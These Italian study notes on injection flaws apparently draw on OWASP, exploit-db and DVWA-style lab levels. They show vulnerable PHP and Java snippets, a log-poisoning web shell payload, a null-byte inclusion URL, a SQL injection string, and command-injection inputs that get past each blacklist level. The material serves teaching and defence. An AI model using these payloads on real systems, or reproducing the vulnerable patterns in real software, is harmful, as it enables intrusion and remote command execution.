## Command injection

- http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution
- https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection

I valori inseriti dall'utente non vengono opportunamente sanitizzati lato server.

> https://www.exploit-db.com/papers/13073

`submit.php`

```
<form method="POST" action="">
	<textarea rows="10" name="comments" cols="60"></textarea>
	<p><input type="submit" value="Post" name="sub"></p>
</form>
```

`comments.php`

```
$comments = $_POST['comments'];

$log = fopen('comments.php','a');
fwrite($log,'<br />'.'<br />.'<center>'.'Comments::'.'<br />'.$comments);
fclose($log);
```

L'input dell'utente non viene sanitizzato.

L'attaccante può sfruttare questa vulnerabilità per eseguire comandi come `phpinfo();`.

`info.php`

```
<?php
$msg = $_GET['msg'];
$ip = getenv('REMOTE_ADDR');
$error = fopen('errorlog.php','a');
fwrite($error,'<br />'.$msg.'<br />'.$ip.'<br />');
fclose($error);
?>
```

L'attaccante inserisce il codice `<? passthru($_GET['cmd']); ?>` nel file di log `errorlog.php`.
Quando il file di log viene richiesto passando col parametro `cmd` il comando `command`, quest'ultimo viene eseguito.

`http://victim.xxx/info.php?msg=<? passthru($_GET['cmd']); ?>`

`http://victim.xxx/errorlog.php?cmd=<command>`

**Null Byte Injection**

`include.php`

```
<?php
	$file = $_GET['file'];
	include('$file.php');
?>
```

L'attaccante esclude `.php` dal nome del file inserendo il terminatore `%00` nell'URL visitata.

`http://victim.xxx/include.php?file=secret.txt%00`

> https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection

```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

oppure

```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

L'attaccante invia come parametro id il valore `' or '1'='1`, che cambia il significato della query.

`http://example.com/app/accountView?id=' or '1'='1`

### Command injection - Low

```
// *nix
$cmd = shell_exec( 'ping  -c 4 ' . $target );
```

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8; CMD`

### Command injection - Medium

```
// Set blacklist
$substitutions = array(
	'&&' => '',
	';'  => '',
);

// Remove any of the charactars in the array (blacklist).
$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
```

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8 | CMD`

### Command injection - High

```
// Set blacklist
$substitutions = array(
'&'  => '',
';'  => '',
'| ' => '',
'-'  => '',
'$'  => '',
'('  => '',
')'  => '',
'`'  => '',
'||' => '',
);

// Remove any of the charactars in the array (blacklist).
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8 |CMD`

